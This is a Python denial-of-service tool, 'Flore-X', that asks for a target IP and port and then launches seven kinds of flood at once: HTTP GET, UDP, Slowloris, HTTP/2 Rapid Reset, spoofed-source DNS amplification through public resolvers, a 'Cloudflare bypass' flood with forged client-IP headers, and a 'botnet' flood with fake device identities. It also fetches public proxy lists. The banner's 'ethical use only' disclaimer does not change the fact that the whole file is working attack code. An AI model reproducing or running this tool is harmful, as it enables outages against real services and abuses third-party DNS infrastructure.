#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Flore-X - S.P.S TEAM - @S_P_I_D_E_YYYY

import time, sys, socket, threading, random, os, json, ssl, struct
from queue import Queue
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed

# ============ Proxy Manager ============
PROXIES = []

def fetch_proxies():
    global PROXIES
    sources = [
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&anonymity=all",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    ]
    for url in sources:
        try:
            r = __import__('requests').get(url, timeout=5)
            if r.status_code == 200:
                PROXIES.extend([p.strip() for p in r.text.strip().split('\n') if p.strip()])
        except: pass
    PROXIES = list(set(PROXIES))
    print(f"\033[92m[+] {len(PROXIES)} proxies loaded\033[0m")

def validate_proxies():
    global PROXIES
    if not PROXIES: return
    valid = []
    for p in PROXIES[:100]:
        try:
            r = __import__('requests').get("http://httpbin.org/ip", proxies={"http": p, "https": p}, timeout=3)
            if r.status_code == 200: valid.append(p)
        except: pass
    PROXIES = valid
    print(f"\033[92m[+] {len(PROXIES)} proxies valid\033[0m")

def get_proxy():
    return random.choice(PROXIES) if PROXIES else None

# ============ Rapid Reset HTTP/2 ============
try:
    import h2.connection, h2.config
    H2_AVAILABLE = True
except ImportError:
    H2_AVAILABLE = False

# ============ DNS Amplification ============
try:
    from scapy.all import IP, UDP, DNS, DNSQR, send
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

# ============ Botnet Simulator ============
COUNTRIES = [
    {"country": "US", "city": "New York", "timezone": "America/New_York", "lang": "en-US"},
    {"country": "GB", "city": "London", "timezone": "Europe/London", "lang": "en-GB"},
    {"country": "DE", "city": "Berlin", "timezone": "Europe/Berlin", "lang": "de-DE"},
    {"country": "FR", "city": "Paris", "timezone": "Europe/Paris", "lang": "fr-FR"},
    {"country": "JP", "city": "Tokyo", "timezone": "Asia/Tokyo", "lang": "ja-JP"},
    {"country": "BR", "city": "São Paulo", "timezone": "America/Sao_Paulo", "lang": "pt-BR"},
    {"country": "SA", "city": "Riyadh", "timezone": "Asia/Riyadh", "lang": "ar-SA"},
    {"country": "AE", "city": "Dubai", "timezone": "Asia/Dubai", "lang": "ar-AE"},
    {"country": "IN", "city": "Mumbai", "timezone": "Asia/Kolkata", "lang": "hi-IN"},
    {"country": "RU", "city": "Moscow", "timezone": "Europe/Moscow", "lang": "ru-RU"},
    {"country": "CA", "city": "Toronto", "timezone": "America/Toronto", "lang": "en-CA"},
    {"country": "AU", "city": "Sydney", "timezone": "Australia/Sydney", "lang": "en-AU"},
    {"country": "KR", "city": "Seoul", "timezone": "Asia/Seoul", "lang": "ko-KR"},
    {"country": "IT", "city": "Rome", "timezone": "Europe/Rome", "lang": "it-IT"},
    {"country": "ES", "city": "Madrid", "timezone": "Europe/Madrid", "lang": "es-ES"},
    {"country": "TR", "city": "Istanbul", "timezone": "Europe/Istanbul", "lang": "tr-TR"},
    {"country": "MX", "city": "Mexico City", "timezone": "America/Mexico_City", "lang": "es-MX"},
    {"country": "SG", "city": "Singapore", "timezone": "Asia/Singapore", "lang": "zh-SG"},
    {"country": "ZA", "city": "Johannesburg", "timezone": "Africa/Johannesburg", "lang": "en-ZA"},
    {"country": "AR", "city": "Buenos Aires", "timezone": "America/Argentina/Buenos_Aires", "lang": "es-AR"},
]

DEVICES = [
    {"model": "SM-G998B", "brand": "Samsung", "os": "Android 14", "w": 1440, "h": 3088},
    {"model": "iPhone 15 Pro Max", "brand": "Apple", "os": "iOS 17.4", "w": 1290, "h": 2796},
    {"model": "Pixel 8 Pro", "brand": "Google", "os": "Android 14", "w": 1344, "h": 2992},
    {"model": "OnePlus 12", "brand": "OnePlus", "os": "Android 14", "w": 1440, "h": 3168},
    {"model": "Xiaomi 14 Pro", "brand": "Xiaomi", "os": "Android 14", "w": 1440, "h": 3200},
    {"model": "SM-S908B", "brand": "Samsung", "os": "Android 14", "w": 1440, "h": 3080},
    {"model": "iPhone 14 Pro", "brand": "Apple", "os": "iOS 17.3", "w": 1179, "h": 2556},
    {"model": "SM-A536B", "brand": "Samsung", "os": "Android 13", "w": 1080, "h": 2400},
    {"model": "Huawei P60 Pro", "brand": "Huawei", "os": "HarmonyOS 4", "w": 1220, "h": 2700},
    {"model": "OPPO Find X6 Pro", "brand": "OPPO", "os": "Android 14", "w": 1440, "h": 3168},
]

UAGENTS_MOBILE = [
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; Pixel 8 Pro) AppleWebKit/537.36 Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 Version/17.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; OnePlus 12) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36",
]

UAGENTS_DESKTOP = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edg/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/109.0",
]

def random_ip():
    return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"

def get_bot_identity():
    country = random.choice(COUNTRIES)
    device = random.choice(DEVICES)
    is_mobile = random.random() > 0.5
    ua = random.choice(UAGENTS_MOBILE if is_mobile else UAGENTS_DESKTOP)
    ip = random_ip()
    return {
        "ip": ip, "country": country["country"], "city": country["city"],
        "lang": country["lang"], "device": device["model"], "brand": device["brand"],
        "os": device["os"], "screen": f"{device['w']}x{device['h']}",
        "ua": ua, "is_mobile": is_mobile
    }

HEADERS_DATA = """Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Cache-Control: no-cache
Pragma: no-cache
Connection: keep-alive
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Upgrade-Insecure-Requests: 1
"""

sent = 0
failed = 0
lock = threading.Lock()
running = True

# ============ 7 Attack Workers ============

def http_worker(host, port):
    global sent, failed
    while running:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((host, port))
            ua = random.choice(UAGENTS_DESKTOP)
            packet = f"GET /?{random.randint(1,999999)} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {ua}\r\n"
            packet += HEADERS_DATA
            packet += f"X-Forwarded-For: {random_ip()}\r\n\r\n"
            s.send(packet.encode())
            with lock: sent += 1
            s.close()
            time.sleep(0.01)
        except:
            with lock: failed += 1
            try: s.close()
            except: pass

def udp_worker(host, port):
    global sent, failed
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while running:
        try:
            s.sendto(os.urandom(random.randint(64, 1490)), (host, port))
            with lock: sent += 1
            time.sleep(0.001)
        except:
            with lock: failed += 1

def slowloris_worker(host, port):
    global sent, failed
    while running:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((host, port))
            s.send(f"GET /?{random.randint(1,999999)} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random.choice(UAGENTS_DESKTOP)}\r\nConnection: keep-alive\r\n".encode())
            for _ in range(100):
                try:
                    s.send(f"X-keep: {random.randint(1,999999)}\r\n".encode())
                    time.sleep(random.uniform(0.1, 0.5))
                except: break
            with lock: sent += 100
            s.close()
        except:
            with lock: failed += 1
            try: s.close()
            except: pass

def rapid_reset_worker(host, port):
    if not H2_AVAILABLE: return
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    while running:
        try:
            sock = socket.create_connection((host, port), timeout=3)
            sock = ctx.wrap_socket(sock, server_hostname=host)
            config = h2.config.H2Configuration(client_side=True)
            conn = h2.connection.H2Connection(config=config)
            conn.initiate_connection()
            sock.sendall(conn.data_to_send())
            for stream_id in range(1, 2001, 2):
                conn.send_headers(stream_id, [
                    (':method', 'GET'), (':path', f'/?{random.randint(1,999999)}'),
                    (':authority', host), (':scheme', 'https'),
                    ('user-agent', random.choice(UAGENTS_DESKTOP))
                ], end_stream=False)
                conn.reset_stream(stream_id)
            sock.sendall(conn.data_to_send())
            sock.close()
            with lock: sent += 1000
        except:
            with lock: failed += 1

def dns_amp_worker(host, port):
    if not SCAPY_AVAILABLE: return
    dns_servers = ['8.8.8.8', '1.1.1.1', '9.9.9.9', '208.67.222.222']
    while running:
        try:
            srv = random.choice(dns_servers)
            pkt = IP(dst=srv, src=host) / UDP(dport=53, sport=random.randint(1024, 65535)) / DNS(rd=1, qd=DNSQR(qname="example.com"))
            send(pkt, verbose=False)
            with lock: sent += 1
        except: pass

def cf_bypass_worker(host, port):
    global sent, failed
    while running:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((host, port))
            packet = f"GET /?{random.randint(1,999999)} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random.choice(UAGENTS_DESKTOP)}\r\n"
            packet += HEADERS_DATA
            packet += "Sec-Ch-Ua: \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\", \"Not?A_Brand\";v=\"99\"\r\n"
            packet += "Sec-Ch-Ua-Mobile: ?0\r\n"
            packet += "Sec-Ch-Ua-Platform: \"Windows\"\r\n"
            packet += f"CF-Connecting-IP: {random_ip()}\r\n"
            packet += f"True-Client-IP: {random_ip()}\r\n"
            packet += f"X-Forwarded-For: {random_ip()}\r\n\r\n"
            s.send(packet.encode())
            with lock: sent += 1
            s.close()
        except:
            with lock: failed += 1
            try: s.close()
            except: pass

def botnet_worker(host, port):
    global sent, failed
    bot = get_bot_identity()
    while running:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((host, port))
            packet = f"GET /?{random.randint(1,999999)} HTTP/1.1\r\nHost: {host}\r\n"
            packet += f"User-Agent: {bot['ua']}\r\n"
            packet += f"Accept-Language: {bot['lang']},{bot['lang'].split('-')[0]};q=0.9\r\n"
            packet += HEADERS_DATA
            packet += f"X-Forwarded-For: {bot['ip']}\r\n"
            packet += f"X-Real-IP: {bot['ip']}\r\n"
            packet += f"X-Device-Model: {bot['device']}\r\n"
            packet += f"X-Device-Brand: {bot['brand']}\r\n"
            packet += f"X-Device-OS: {bot['os']}\r\n"
            packet += f"X-Device-Screen: {bot['screen']}\r\n"
            packet += f"X-Country: {bot['country']}\r\n"
            packet += f"X-City: {bot['city']}\r\n"
            if bot['is_mobile']:
                packet += "Sec-Ch-Ua-Mobile: ?1\r\n"
                packet += f"Sec-Ch-Ua-Platform: \"{bot['os']}\"\r\n"
            else:
                packet += "Sec-Ch-Ua-Mobile: ?0\r\n"
                packet += "Sec-Ch-Ua-Platform: \"Windows\"\r\n"
            packet += "\r\n"
            s.send(packet.encode())
            with lock: sent += 1
            s.close()
            time.sleep(random.uniform(0.01, 0.1))
            if sent % 50 == 0: bot = get_bot_identity()
        except:
            with lock: failed += 1
            try: s.close()
            except: pass

def main():
    global running
    
    print("""\033[91m
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║   \033[93m███████╗██╗      \033[96m██████╗ \033[93m██████╗ \033[96m███████╗     \033[93m██╗  ██╗\033[91m           ║
║   \033[93m██╔════╝██║     \033[96m██╔═══██╗\033[93m██╔══██╗\033[96m██╔════╝     \033[93m╚██╗██╔╝\033[91m           ║
║   \033[93m█████╗  ██║     \033[96m██║   ██║\033[93m██████╔╝\033[96m█████╗        \033[93m╚███╔╝\033[91m            ║
║   \033[93m██╔══╝  ██║     \033[96m██║   ██║\033[93m██╔══██╗\033[96m██╔══╝        \033[93m██╔██╗\033[91m            ║
║   \033[93m██║     ███████╗\033[96m╚██████╔╝\033[93m██║  ██║\033[96m███████╗     \033[93m██╔╝ ██╗\033[91m           ║
║   \033[93m╚═╝     ╚══════╝\033[96m ╚═════╝ \033[93m╚═╝  ╚═╝\033[96m╚══════╝     \033[93m╚═╝  ╚═╝\033[91m           ║
║                                                                      ║
║   \033[95m❤️  SPIDEY X CHEAT\033[91m              \033[95m⚔️ For ethical use only\033[91m            ║
║   \033[95m👤 @S_P_I_D_E_YYYY\033[91m              \033[95m⚠️⚠️⚠️ This tool is for legal and ethical use only\033[91m                   ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝\033[0m
""")
    
    host = input("\033[96m🎯 Target IP: \033[0m").strip()
    port = int(input("\033[96m🔌 Port [443]: \033[0m") or 443)
    threads = int(input("\033[96m🧵 Threads [500]: \033[0m") or 500)
    
    print(f"\n\033[93m[+] Loading proxies...\033[0m")
    fetch_proxies()
    validate_proxies()
    
    total = threads * 7
    print(f"\n\033[91m🔥 Attacking {host}:{port} | {total} threads\033[0m")
    print(f"\033[92m[+] HTTP | UDP | Slowloris | Rapid Reset | DNS Amp | CF Bypass | Botnet\033[0m\n")
    
    for _ in range(threads):
        threading.Thread(target=http_worker, args=(host, port), daemon=True).start()
        threading.Thread(target=udp_worker, args=(host, port), daemon=True).start()
        threading.Thread(target=slowloris_worker, args=(host, port), daemon=True).start()
        threading.Thread(target=rapid_reset_worker, args=(host, port), daemon=True).start()
        threading.Thread(target=dns_amp_worker, args=(host, port), daemon=True).start()
        threading.Thread(target=cf_bypass_worker, args=(host, port), daemon=True).start()
        threading.Thread(target=botnet_worker, args=(host, port), daemon=True).start()
    
    start = time.time()
    try:
        while True:
            time.sleep(1)
            with lock:
                elapsed = time.time() - start
                print(f"\r\033[92m✅ {sent:,}\033[0m | \033[91m❌ {failed:,}\033[0m | \033[96m⚡ {sent/elapsed:.0f}/s\033[0m | \033[93m🌐 {len(PROXIES)} proxies\033[0m", end="")
    except KeyboardInterrupt:
        running = False
        elapsed = time.time() - start
        print(f"\n\n\033[91m⏹️ Stopped\033[0m | \033[92m✅ {sent:,}\033[0m | \033[91m❌ {failed:,}\033[0m | \033[96m⚡ {sent/elapsed:.0f}/s\033[0m")

if __name__ == "__main__":
    main()